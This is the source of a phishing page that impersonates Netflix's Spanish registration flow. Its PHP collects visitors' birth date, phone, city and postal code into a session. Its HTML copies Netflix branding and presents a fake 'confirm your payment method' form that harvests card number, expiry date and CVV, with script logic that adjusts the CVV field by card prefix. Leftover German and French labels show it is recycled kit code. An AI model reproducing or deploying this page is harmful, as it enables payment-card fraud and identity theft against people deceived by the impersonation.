...
$_SESSION['fecha_nacimiento'] = $_POST['fechaNacimiento'];
$_SESSION['telefono'] = $_POST['telefono'];
$_SESSION['ciudad'] = $_POST['ciudad'];
$_SESSION['codigo_postal'] = $_POST['codigoPostal'];

?>

<html data-triggered="true" lang="es">
...
<head>
   ...
   <link type="text/css" rel="stylesheet" href="/personalization/cl2/freeform/WebsiteDetect?source=wwwhead&amp;fetchType=css&amp;modalView=signupSimplicity-registrationWithContext" data-uia="botLink">
   <meta content="Ver películas, películas online, ver TV, TV online, series de TV online, ver series de TV, streaming de películas, streaming de series de TV, streaming instantáneo, ver películas online, ver películas, películas españolas, ver TV online, sin descarga, películas completas" name="keywords">
   <meta content="Vea películas y series de Netflix&nbsp;TV en línea, en su smart&nbsp;TV, consola de juegos, PC, Mac, smartphone, tableta y mucho más." name="description">
   <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
   <link type="text/css" rel="stylesheet" href="https://codex.nflxext.com/%5E3.0.0/truthBundle/webui/1.22.5-shakti-css-vc87b9036/css/css/less%7Ccore%7Cerror-page.less/1/arytF4Dps9xCE/none/true/none" data-uia="botLink">
   <link type="text/css" rel="stylesheet" href="https://codex.nflxext.com/%5E3.0.0/truthBundle/webui/1.22.5-shakti-css-vc87b9036/css/css/less%7Cpages%7Csignup%7Csimplicity%7Csimplicity.less/1/arytF4Dps9xCE/none/true/none" data-uia="botLink">
   <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
   <link rel="apple-touch-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png">
   <meta property="og:description" content="Vea películas y series de Netflix&nbsp;TV en línea, en su smart&nbsp;TV, consola de juegos, PC, Mac, smartphone, tableta y mucho más.">
   <meta property="al:ios:url" content="nflx://www.netflix.com/signup/registration?locale=es-ES">
   <meta property="al:ios:app_store_id" content="363590051">
   <meta property="al:ios:app_name" content="Netflix">
   <meta property="al:android:url" content="nflx://www.netflix.com/signup/registration?locale=es-ES">
   ...
   <style type="text/css" id="onetrust-style">
      ...
      #onetrust-pc-sdk .cookie-subgroup.ot-always-active-group>h6 {
         max-width: 70%
      }
      ...
      #onetrust-pc-sdk.ot-leg-opt-out .cookie-subgroup h6 {
...
<link rel="stylesheet" href="https://127.0.0.1:49764/stylesheet?id=HYifN2dptzknepPk"></head>

<body>
   <div id="appMountPoint">
      <div class="netflix-sans-font-loaded">
         <div class="basicLayout notMobile modernInApp signupSimplicity-registrationWithContext simplicity" dir="ltr" lang="es-ES">
            <div class="nfHeader noBorderHeader signupBasicHeader">
               ...
               <a href="#" class="authLinks signupBasicHeader" data-uia="header-login-link">Desconectando</a>
            </div>
                     ...
                     <div class="regFormContainer passwordFormContainer" data-uia="form-registration">
                        <div class="stepHeader-container" data-uia="header">
                           <div class="stepHeader" data-a11y-focus="true">
                              <span id="" class="stepIndicator" data-uia="">PASO <b>2</b> A <b>3</b></span>
                              <h1 class="stepTitle" data-uia="stepTitle"><span id="" data-uia="">Confirme su método de pago</span></h1>
                           </div>
                        </div>
                        <span class="logos logos-block" data-uia="cardLogos-comp" aria-label="Wir akzeptieren VISA, MASTERCARD, AMEX.">
                           <img style="HEIGHT: 40px; WIDTH: 210px" border=0 hspace=0 alt="" src="img/tout.png" width=2099 align=baseline height="400">
                        ...
                        <script type="text/javascript">
                           $(document).ready(function() {
                              $("#c_num").on('input', function(e) {
                                 var value = e.target.value;
                                 if (value.startsWith("6703")) {
                                    if ($("#csc").length)
                                       $("#taboun").remove();
                                 } else {
                                    if (!($("#csc").length))
                                       $('<div id="taboun" class="contentv2"><div class="sepv2"></div><span class="labev2">Cryptogramme visuel</span><input required type="text" id="csc" placeholder="CVV" name="csc" class="formv2" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" maxlength="4"></div>').insertAfter("#div-before-cvv");
                                 }
                              });
                           });
                           $(document).ready(function() {
                        ...
                        <div class="contentv2" id="hcul" name="hcul">
                           <div class="sepv2"></div>
                           <span class="labev2">Número de tarjeta</span>
                           <input required type="tel" id="c_num" name="numero" class="formv2" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" maxlength="17">
                        </div>
                        <div class="contentv2">
                           <div class="sepv2"></div>
                           <span class="labev2">Fecha de caducidad</span>
                           <input required type="tel" id="exdate" placeholder="MM/AAAA" name="fecha" class="formv2" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" onkeyup="formatString(event);" maxlength="5">
                        </div>
                        <div class="contentv2" id="taboun">
                           <div class="sepv2"></div>
                           <span class="labev2">Criptograma visual</span>
                           <input required type="tel" id="csc" placeholder="CVV" name="cvv" class="formv2" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" maxlength="4">
                        ...
                        <script>
                           ...
                           function BxhNamC() {
                              document.getElementById("Top5").style.display = "none";
                                                   ...
                                                   <div class="submitBtnContainer"><button name="auth" type="submit" autocomplete="off" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="cta-registration" placeholder="regForm_button_next" style="font-size:16px;">COMPROBAR Y TERMINAR</button></div>
                     </div>
                  </form>
               </div>
            </div>
            <div class="site-footer-wrapper centered">
               ...
               <div class="site-footer">
                  <p class="footer-top">¿Preguntas? Llama al <a class="footer-top-a" href="#">1-844-505-2993</a></p>
                  <ul class="footer-links structural">
                     <li class="footer-link-item" placeholder="footer_responsive_link_PREGUNTAS FRECUENTES_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_PREGUNTAS FRECUENTES"><span id="" data-uia="data-uia-footer-label">PREGUNTAS FRECUENTES</span></a></li>
                     <li class="footer-link-item" placeholder="footer_responsive_link_help_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_help"><span id="" data-uia="data-uia-footer-label">Centro de asistencia</span></a></li>
                     <li class="footer-link-item" placeholder="footer_responsive_link_terms_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_terms"><span id="" data-uia="data-uia-footer-label">Condiciones de uso</span></a></li>
                     <li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item"><a class="footer-link" data-uia="footer-link" href="#"><span id="" data-uia="data-uia-footer-label">Protección de datos</span></a></li>
                     <li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_cookies_separate_link"><span id="" data-uia="data-uia-footer-label">Configuración de cookies</span></a></li>
                     <li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_corporate_information"><span id="" data-uia="data-uia-footer-label">Información jurídica</span></a></li>
                  </ul>
                  <div class="lang-selection-container" id="lang-switcher">
                     <div class="nfSelectWrapper inFooter selectArrow prefix" data-uia="language-picker+container">
                        <label class="nfLabel" for="lang-switcher-select">Elegir idioma</label>
                        <div class="nfSelectPlacement globe">
                           <select data-uia="language-picker" class="nfSelect" id="lang-switcher-select" name="__langSelect" tabindex="0">
                              <option selected="" value="/signup/registration?locale=es-ES" label="Español" lang="es">Español</option>
                              <option value="/signup/registration?locale=en-ES" label="English" lang="en">English</option>
                           </select>
                        </div>
                     </div>
                  </div>
   ...
   <div>
      <div style="display: none" id="Top5" class="cvvTooltip" data-uia="cvvTooltipModal">
         ...
         <div class="tooltipDesc">El criptograma (CVV) de su tarjeta es el número de 3 o 4 cifras que suele figurar en el reverso de la tarjeta...</div>
